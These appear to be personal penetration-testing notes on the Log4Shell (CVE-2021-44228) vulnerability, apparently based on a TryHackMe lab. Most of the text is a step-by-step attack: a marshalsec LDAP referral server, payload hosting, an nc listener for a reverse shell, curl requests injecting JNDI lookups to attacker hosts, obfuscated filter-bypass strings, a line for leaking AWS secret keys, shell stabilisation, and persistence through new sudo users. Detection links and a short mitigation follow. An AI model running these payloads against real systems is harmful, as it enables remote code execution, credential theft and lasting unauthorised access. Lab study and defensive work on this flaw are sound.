# List of web exploits that leverage java

---

# CVE-2021-44228 (Log4J exploit Notes)

# Proof of concept

## base log4j syntax examples

```
${sys:os.name}
${sys:user.name}
${log4j:configParentLocation}
${ENV:PATH}
${ENV:HOSTNAME}
${java:version}
```

## installing packages you need for the exploit

### setup packages for payload.java and supporting marshalsec files

* (install required packages)

`sudo apt install -y maven default-jre`

* will differ for your linux distro

### grab marshalsec code to help exploit log4j and build the utility
`git clone https://github.com/mbechler/marshalsec.git && cd marshalsec`
`mvn clean package -DskipTests`

#### start the ldap reference server `marshealsec utility` that log4j will interact with

`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://rhost:rport/#sploit"`
`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.10.1:8000/#sploit"`

* rhost = attacker ip
* lport = port of the web server, python3 webserver default to port 8000

### change java type on compile without having to change the default

`javac exploit.java -source 8 -target 8`


## setup web server in directory with the payload java.class file
`python -m SimpleHTTPServer`b
`python3 -m http.server`
`php -S <lhost>:<lport>`

## setup listener to catch the reverse shell

`nc -lvnp <lport>`
`nc -lvnp 8900`

## launch the attack with curl

`curl 'http://10.10.89.179:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'`
`wget -qO- 'http://10.10.89.179:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'`

	* wget will not work, probably missing something

---

# make reverse linux shell stable
1. make stable tty
	`python3 -c 'import pty;pty.spawn("/bin/bash")'
	`script -q /dev/null -c /bin/bash`

2. make it able to clear the screen
	`export TERM=xterm`
0r
	`env | grep TERM`
	`export TERM=<whatever out machine TERM var is>`
	`export TERM=screen-256color`

3. allow ctrl+c without exiting the reverse shell
	`ctrl+z` = background rev shell
	`stty raw -echo;fg` -> enter -> enter

4. match the lines and columns to prevent broken line wraps
	* figure out lhost `rows` and `columns`
		`stty -a`

	* set the rev shell tty to match our machine
		`stty rows <row-number> cols <columns-number>`
		`stty rows 7 cols 94`

---

# log4j detection resources (ref from the thm log4j room
https://tryhackme.com/room/solar

https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d
https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228
https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1
https://github.com/darkarnium/CVE-2021-44228

`https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/`
---

# creating a really user for poor persistance or change the log4j solar user's pw

```
passwd solr

0r

useradd <new_username>
passwd <username>
sudo usermod -aG sudo <username>
	* add them to the sudo group

sudo usermod -aG wheel <username>
	* wheel is sudo group for other certain linux distros

# when creating user don't forget to change the default shell from sh to something else
sudo useradd -ms /bin/bash <username>
	m = "home-dir"
	s = "default shell"

```

---

# log4j bypass 

```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}
```

* NOTE;
* to make use of the `rmi://` protocol or `Java remote method invocation`

* potentially able to extract data from AWS

	`${env:AWS_SECRET_ACCESS_KEY}`

### Additional techniques from reddit

`https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/`

---

# mitigation the log4j vuln
1. locate solr.in.sh file

	`locate solr.in.sh`
	`find / -type f -name solr.in.sh`

2. create backup file before modifying any important file

```
cp /etc/default/
sudo cp solr.in.sh solr.in.sh.bak
``` 

3. add the patch and restart the service to push changes
	* it's ok if you put this at the complete end of the `solr.in.sh` file

```
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"

sudo /etc/init.d/solr restart
```

* install patch is it's ready for your device/distro
